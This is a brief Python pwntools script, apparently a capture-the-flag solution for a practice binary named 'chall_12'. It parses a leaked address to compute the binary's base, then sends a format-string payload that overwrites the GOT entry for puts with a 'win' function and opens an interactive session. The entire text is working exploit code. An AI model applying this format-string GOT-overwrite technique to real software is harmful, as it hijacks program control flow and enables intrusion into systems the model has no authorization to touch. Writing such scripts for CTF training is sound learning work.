# coding: utf-8
from pwn import *
pr = process("./chall_12")
elf = ELF("./chall_12")
pr.recvuntil(":")
ovr_flw = pr.recv()
elf.address = int(ovr_flw, 16) - elf.sym.main
payload = fmtstr_payload(7, {elf.got.puts : elf.sym.win})
pr.sendline(payload)
pr.interactive()
pr.close()
